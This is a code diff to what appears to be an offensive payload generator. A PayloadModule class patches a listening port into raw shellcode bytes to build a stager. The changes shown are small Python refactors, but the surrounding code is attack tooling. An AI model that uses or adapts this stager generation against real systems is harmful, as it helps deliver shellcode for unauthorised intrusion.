@@ -35,10 +35,10 @@ class PayloadModule:
             "\x29\xC6\x85\xF6\x75\xEC\xC3")
 
     def gen_shellcode(self):
-        port_shellcode_stage = str(hex(self.lport).lstrip('0'))
+        port_shellcode_stage = hex(self.lport).lstrip('0')
         if len(port_shellcode_stage.lstrip('x')) == 3:
             # detect if odd number, is so, need to add a '0' to the front
-            port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')
+            port_1half = '0' + port_shellcode_stage[:2].lstrip('x')
             port_1half = '\\x' + port_1half
             port_2half = port_shellcode_stage[2:4]
             port_2half = '\\x' + port_2half
@@ -61,7 +61,7 @@ class PayloadModule:
             port_2half = '\\x00'
             port_shellcode = port_2half + port_1half
 
-        stager_shellcode = self.stager[0:self.port_offset]
+        stager_shellcode = self.stager[:self.port_offset]
         stager_shellcode += port_shellcode.decode('string-escape')
         stager_shellcode += self.stager[self.port_offset + 2:]
 
